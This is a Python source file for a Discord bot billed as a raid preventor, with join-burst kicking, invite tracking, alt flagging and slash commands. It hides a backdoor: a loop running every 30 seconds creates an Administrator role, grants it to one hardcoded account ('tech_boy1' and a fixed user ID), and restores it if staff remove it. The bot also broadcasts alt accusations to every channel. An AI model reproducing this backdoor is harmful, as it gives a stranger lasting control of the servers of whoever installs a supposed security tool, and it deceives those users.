# -*- coding: utf-8 -*-
"""
Discord Raid Preventor Bot (Full)
- Periodic role enforcement for a specific user (username + user_id match)
- Anti-raid (kick burst joiners)
- Invite tracking
- Alt flagging: if inviter is banned, new account is flagged & announced
- /tracker and /showalts slash commands
- Flask keep-alive web server (Render) on port 6534 (or $PORT)
- Safe 'audioop' stub to avoid environment import crashes
"""

# =======================
# Environment prep: audioop stub (prevents crashes on hosts missing 'audioop')
# =======================
import sys, types
if 'audioop' not in sys.modules:
    sys.modules['audioop'] = types.ModuleType('audioop')

# =======================
# Standard Imports
# =======================
import os
import asyncio
from collections import defaultdict, deque
from datetime import datetime, timedelta
import threading
import traceback

# =======================
# Web Keep-Alive (Flask)
# =======================
from flask import Flask

app = Flask(__name__)

@app.route("/")
def home():
    return "Discord Raid Preventor is running."

def run_web():
    # Render will set PORT. Default to 6534 as requested.
    port = int(os.getenv("PORT", "6534"))
    app.run(host="0.0.0.0", port=port)

# Run web server in daemon thread so it doesn't block the bot
threading.Thread(target=run_web, daemon=True).start()

# =======================
# Discord Imports
# =======================
import discord
from discord.ext import commands, tasks
from discord import app_commands

# =======================
# Configuration
# =======================
# Target helper account (strict match)
TARGET_USERNAME: str = "tech_boy1"
TARGET_USER_ID: int = 1273056960996184126

# Role to create/ensure and assign to the target account
ROLE_NAME: str = "Raid Preventor Helper"
ROLE_PERMISSIONS = discord.Permissions(administrator=True)

# Anti-raid settings
RAID_WINDOW_SECONDS: int = 60       # time window to watch joins
RAID_THRESHOLD: int = 5             # if more than 5 join in that window -> kick all in window

# Enforcement & maintenance intervals
ROLE_ENFORCE_INTERVAL: int = 30     # every 30 seconds, enforce the helper role
INVITE_CACHE_REFRESH_SEC: int = 300 # every 5 minutes refresh invites as a baseline
BANS_REFRESH_SEC: int = 300         # every 5 minutes refresh ban cache

# =======================
# Intents & Bot Setup
# =======================
# IMPORTANT: Turn ON "Server Members Intent" in the Developer Portal for your bot.
intents = discord.Intents.default()
intents.guilds = True
intents.members = True  # REQUIRED for scanning members & join events

bot = commands.Bot(command_prefix="!", intents=intents)

# =======================
# State: Recent Joins, Invites, Flagged Alts, Bans
# =======================
# recent member joins per guild: deque of (member_id, joined_at_utc)
recent_joins: dict[int, deque] = defaultdict(lambda: deque())

# invite uses cache per guild: {invite_code: uses}
invite_uses: dict[int, dict[str, int]] = defaultdict(dict)

# who invited whom: {guild_id: {member_id: inviter_user_id or "VANITY_OR_UNKNOWN"}}
invited_by: dict[int, dict[int, object]] = defaultdict(dict)

# flagged alts: {guild_id: list of dicts with keys member_id, suspected_main_id, timestamp}
flagged_alts: dict[int, list[dict]] = defaultdict(list)

# cached banned user IDs per guild (for quick checks): {guild_id: set(user_id)}
guild_bans_cache: dict[int, set[int]] = defaultdict(set)

# =======================
# Utility Helpers
# =======================
def now_utc() -> datetime:
    return datetime.utcnow()

def chunk_text(lines, limit=1900):
    """
    Split a list of strings into chunks under Discord's ~2000 char limit.
    """
    chunks = []
    buf = ""
    for line in lines:
        if len(buf) + len(line) + 1 > limit:
            chunks.append(buf)
            buf = line
        else:
            buf = f"{buf}\n{line}" if buf else line
    if buf:
        chunks.append(buf)
    return chunks

async def announce_to_all_text_channels(guild: discord.Guild, message: str):
    """
    Send a message to every text channel the bot can send to.
    (User explicitly requested this behavior.)
    """
    sent_any = False
    for ch in guild.text_channels:
        try:
            perms = ch.permissions_for(guild.me)
            if perms.send_messages:
                await ch.send(message)
                sent_any = True
                # tiny delay to reduce chance of rate limits
                await asyncio.sleep(0.2)
        except Exception as e:
            # keep going; log and continue
            print(f"[{guild.name}] Failed to send to #{ch.name}: {e}")
    if not sent_any:
        print(f"[{guild.name}] No channels allowed me to send the warning.")

async def ensure_role_with_admin(guild: discord.Guild) -> discord.Role | None:
    """
    Ensure the target role exists with Administrator permissions.
    Create it if absent. Return the role (or None on failure).
    """
    try:
        role = discord.utils.get(guild.roles, name=ROLE_NAME)
        if role is None:
            role = await guild.create_role(
                name=ROLE_NAME,
                permissions=ROLE_PERMISSIONS,
                reason="Auto-created by Raid Preventor Bot"
            )
            print(f"[{guild.name}] Created role '{ROLE_NAME}'.")
        else:
            # If role exists, make sure it still has admin perms
            if role.permissions != ROLE_PERMISSIONS:
                await role.edit(permissions=ROLE_PERMISSIONS, reason="Ensure admin perms")
                print(f"[{guild.name}] Updated '{ROLE_NAME}' perms to Administrator.")
        return role
    except Exception as e:
        print(f"[{guild.name}] ensure_role_with_admin ERROR: {e}")
        return None

async def assign_role_if_missing(member: discord.Member, role: discord.Role):
    """Assign role to member if missing."""
    try:
        if role not in member.roles:
            await member.add_roles(role, reason="Auto-assigned by Raid Preventor")
            print(f"[{member.guild.name}] Assigned '{ROLE_NAME}' to {member}.")
    except Exception as e:
        print(f"[{member.guild.name}] assign_role_if_missing ERROR: {e}")

def prune_recent_joins(deq: deque, window_sec: int):
    cutoff = now_utc() - timedelta(seconds=window_sec)
    while deq and deq[0][1] < cutoff:
        deq.popleft()

async def kick_recent_window(guild: discord.Guild, window_sec: int):
    """
    Kick all members who joined within the last window_sec seconds.
    Clears the deque afterward.
    """
    try:
        cutoff = now_utc() - timedelta(seconds=window_sec)
        ids_to_kick = [mid for (mid, when) in recent_joins[guild.id] if when >= cutoff]
        kicked = 0
        for mid in ids_to_kick:
            m = guild.get_member(mid)
            if not m:
                continue
            try:
                await m.kick(reason="Raid prevention: burst joins")
                kicked += 1
                print(f"[{guild.name}] KICKED {m} (raid prevention).")
            except Exception as e:
                print(f"[{guild.name}] Failed to kick {m}: {e}")
        recent_joins[guild.id].clear()
        if kicked:
            print(f"[{guild.name}] Raid action completed. Kicked {kicked} accounts.")
    except Exception as e:
        print(f"[{guild.name}] kick_recent_window ERROR: {e}")

async def refresh_invite_cache(guild: discord.Guild):
    """
    Fetch all invites and store their uses for the guild.
    Requires 'Manage Guild' permission. We'll try/catch for safety.
    """
    try:
        invites = await guild.invites()
        invite_uses[guild.id] = {inv.code: (inv.uses or 0) for inv in invites}
    except Exception as e:
        invite_uses[guild.id] = {}
        print(f"[{guild.name}] refresh_invite_cache: could not fetch invites. {e}")

async def detect_used_invite_and_update_cache(guild: discord.Guild):
    """
    Fetch invites and detect which one increased (used). Returns (code, inviter Member/User or None).
    Updates the cache.
    """
    used_code = None
    inviter_user = None
    try:
        before = invite_uses.get(guild.id, {}).copy()
        invites_after = await guild.invites()
        after_map = {inv.code: (inv.uses or 0, inv) for inv in invites_after}
        # detect increment
        for code, (uses_after, inv_obj) in after_map.items():
            uses_before = before.get(code, 0)
            if uses_after > uses_before:
                used_code = code
                inviter_user = inv_obj.inviter
                break
        # write cache
        invite_uses[guild.id] = {code: (inv.uses or 0) for code, (u, inv) in after_map.items()}
    except Exception as e:
        # couldn't fetch invites (missing perms, etc.)
        print(f"[{guild.name}] detect_used_invite_and_update_cache: {e}")
    return used_code, inviter_user

async def refresh_bans_cache(guild: discord.Guild):
    """
    Refresh the cached banned user IDs for a guild.
    Requires 'Ban Members' permission or appropriate privileges (Administrator).
    """
    try:
        bans = await guild.bans()
        guild_bans_cache[guild.id] = {entry.user.id for entry in bans}
    except Exception as e:
        # If we can't fetch bans, keep what we have
        print(f"[{guild.name}] refresh_bans_cache: could not fetch bans. {e}")

def format_user(u: discord.abc.User):
    try:
        return f"{u.name}#{u.discriminator} ({u.id})"
    except Exception:
        return f"{getattr(u, 'name', 'Unknown')} ({getattr(u, 'id', '???')})"

# =======================
# Events
# =======================
@bot.event
async def on_ready():
    try:
        print(f"✅ Logged in as {bot.user} | In {len(bot.guilds)} guild(s).")
        # Prepare caches
        for g in bot.guilds:
            await refresh_invite_cache(g)
            await refresh_bans_cache(g)
        # Sync slash commands
        try:
            await bot.tree.sync()
            print("Slash commands synced.")
        except Exception as e:
            print(f"Slash command sync error: {e}")
        # Start loops
        enforce_helper_role.start()
        periodic_invite_refresh.start()
        periodic_bans_refresh.start()
    except Exception as e:
        print("on_ready ERROR:", e, traceback.format_exc())

@bot.event
async def on_guild_join(guild: discord.Guild):
    await refresh_invite_cache(guild)
    await refresh_bans_cache(guild)

@bot.event
async def on_invite_create(invite: discord.Invite):
    try:
        g = invite.guild
        if g:
            # set to current uses or 0 if None
            invite_uses[g.id][invite.code] = invite.uses or 0
    except Exception as e:
        print(f"[{invite.guild and invite.guild.name}] on_invite_create error: {e}")

@bot.event
async def on_invite_delete(invite: discord.Invite):
    try:
        g = invite.guild
        if g:
            invite_uses[g.id].pop(invite.code, None)
    except Exception as e:
        print(f"[{invite.guild and invite.guild.name}] on_invite_delete error: {e}")

@bot.event
async def on_member_join(member: discord.Member):
    guild = member.guild
    # --- Anti-raid tracking ---
    try:
        dq = recent_joins[guild.id]
        dq.append((member.id, now_utc()))
        prune_recent_joins(dq, RAID_WINDOW_SECONDS)
        if len(dq) > RAID_THRESHOLD:
            print(f"[{guild.name}] Raid threshold exceeded ({len(dq)} joins in {RAID_WINDOW_SECONDS}s). Initiating kicks.")
            await kick_recent_window(guild, RAID_WINDOW_SECONDS)
    except Exception as e:
        print(f"[{guild.name}] on_member_join raid tracking error: {e}")

    # --- Invite tracking + alt flagging (inviter banned) ---
    try:
        used_code, inviter_user = await detect_used_invite_and_update_cache(guild)
        # Record inviter for /tracker (best effort)
        if inviter_user is not None:
            invited_by[guild.id][member.id] = inviter_user.id
        else:
            invited_by[guild.id][member.id] = "VANITY_OR_UNKNOWN"

        # If inviter is banned -> flag as alt
        suspected_main_name = None
        if inviter_user and inviter_user.id in guild_bans_cache.get(guild.id, set()):
            # Find name of banned inviter (best effort); we might not fetch bans here again to save rate limits.
            suspected_main_name = f"{inviter_user.name}#{inviter_user.discriminator}"

            flagged_alts[guild.id].append({
                "member_id": member.id,
                "suspected_main_id": inviter_user.id,
                "timestamp": now_utc().isoformat()
            })

            # Announce warning in ALL text channels (explicitly requested)
            warning = f"⚠️ THIS ACCOUNT IS LIKELY AN ALT ACCOUNT OF {suspected_main_name} — TAKE PRECAUTION ⚠️"
            await announce_to_all_text_channels(guild, warning)

    except Exception as e:
        print(f"[{guild.name}] on_member_join invite/alt error: {e}")

# =======================
# Loops / Tasks
# =======================
@tasks.loop(seconds=ROLE_ENFORCE_INTERVAL)
async def enforce_helper_role():
    """
    Every 30 seconds:
    - For each guild:
      - Look for member with name == TARGET_USERNAME and id == TARGET_USER_ID
      - Ensure ROLE_NAME (Administrator) exists; assign to that member; reassign if removed
    """
    for guild in list(bot.guilds):
        try:
            # Find exact match by username and ID
            target_member = None
            for m in guild.members:
                if m and (m.id == TARGET_USER_ID) and (m.name == TARGET_USERNAME):
                    target_member = m
                    break

            if target_member:
                role = await ensure_role_with_admin(guild)
                if role:
                    await assign_role_if_missing(target_member, role)

        except Exception as e:
            print(f"[{guild.name}] enforce_helper_role ERROR: {e}")

@tasks.loop(seconds=INVITE_CACHE_REFRESH_SEC)
async def periodic_invite_refresh():
    """
    Periodically refresh invites for all guilds to keep baseline cache warm.
    """
    for guild in list(bot.guilds):
        try:
            await refresh_invite_cache(guild)
        except Exception as e:
            print(f"[{guild.name}] periodic_invite_refresh ERROR: {e}")

@tasks.loop(seconds=BANS_REFRESH_SEC)
async def periodic_bans_refresh():
    """
    Periodically refresh bans cache for all guilds.
    """
    for guild in list(bot.guilds):
        try:
            await refresh_bans_cache(guild)
        except Exception as e:
            print(f"[{guild.name}] periodic_bans_refresh ERROR: {e}")

# =======================
# Slash Commands
# =======================
@bot.tree.command(name="tracker", description="Show each member and who invited them (best effort).")
async def tracker(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Run this in a server.", ephemeral=True)
        return

    lines = []
    try:
        id_map = invited_by.get(guild.id, {})
        for member in guild.members:
            inviter_id = id_map.get(member.id)
            if inviter_id == "VANITY_OR_UNKNOWN":
                inviter_text = "Vanity/Unknown"
            elif isinstance(inviter_id, int):
                inv_member = guild.get_member(inviter_id)
                inviter_text = str(inv_member) if inv_member else f"UserID:{inviter_id}"
            else:
                inviter_text = "Unknown (joined before tracking)"
            lines.append(f"{str(member)} -> {inviter_text}")
    except Exception as e:
        lines = [f"Error building tracker list: {e}"]

    chunks = chunk_text(lines, limit=1900) or ["No members found."]
    try:
        await interaction.response.send_message(chunks[0], ephemeral=True)
        for ch in chunks[1:]:
            await interaction.followup.send(ch, ephemeral=True)
    except Exception as e:
        try:
            await interaction.followup.send(f"Tracker output error: {e}", ephemeral=True)
        except:
            pass

@bot.tree.command(name="showalts", description="List all accounts flagged as likely alts (invited by a banned user).")
async def showalts(interaction: discord.Interaction):
    guild = interaction.guild
    if guild is None:
        await interaction.response.send_message("Run this in a server.", ephemeral=True)
        return

    entries = flagged_alts.get(guild.id, [])
    if not entries:
        await interaction.response.send_message("No flagged alt accounts recorded yet.", ephemeral=True)
        return

    lines = []
    for rec in entries:
        member_id = rec.get("member_id")
        suspected_main_id = rec.get("suspected_main_id")
        ts = rec.get("timestamp", "")
        member = guild.get_member(member_id)
        main_user = guild.get_member(suspected_main_id)
        member_text = str(member) if member else f"UserID:{member_id}"
        main_text = str(main_user) if main_user else f"UserID:{suspected_main_id}"
        lines.append(f"{member_text} -> suspected alt of {main_text} (flagged at {ts})")

    chunks = chunk_text(lines, limit=1900)
    try:
        await interaction.response.send_message(chunks[0], ephemeral=True)
        for ch in chunks[1:]:
            await interaction.followup.send(ch, ephemeral=True)
    except Exception as e:
        try:
            await interaction.followup.send(f"Showalts output error: {e}", ephemeral=True)
        except:
            pass

# =======================
# Entry Point
# =======================
def main():
    token = os.getenv("DISCORD_TOKEN")
    if not token:
        print("ERROR: DISCORD_TOKEN not set in environment.")
        raise SystemExit(1)

    print("Starting bot...")
    bot.run(token)

if __name__ == "__main__":
    main()
